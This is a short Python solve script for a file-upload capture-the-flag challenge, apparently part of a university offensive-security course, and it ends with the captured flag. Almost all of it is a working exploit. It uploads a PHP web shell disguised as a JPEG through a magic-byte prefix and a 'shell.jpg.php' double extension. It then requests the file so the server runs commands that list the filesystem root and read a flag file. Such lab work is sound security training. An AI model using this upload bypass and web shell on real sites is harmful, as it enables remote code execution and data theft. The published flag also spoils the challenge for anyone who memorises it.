import requests

url = 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1502'
netid = 'xz4344'
cookies = {"CHALBROKER_USER_ID": netid}

data = {
    'name': 'ctf',
    'email': 'ctf@ctf.com',
}

file_name = 'shell.jpg.php'
file_content = b'\xff\xd8\xff;\n<?php system("ls /"); system("cat /flag.php"); ?>'
content_type = 'image/jpg'
files = {
    'uploadFile': (file_name, file_content, content_type),
}

print(f"[*] Uploading File: {file_name}")
r1 = requests.post(f'{url}/upload.php', data=data, files=files, cookies=cookies)
print(f"[+] File Upload Response: {r1.text}")

print(f"[*] Accessing Uploaded File: {file_name}")
r2 = requests.get(f'{url}/profile_images/{file_name}', cookies=cookies)
print(f"[+] Uploaded File Access Response:\n{r2.text}")

# flag{f1l3_upl04d_N1nj4_e91119eb1dcb30c7}
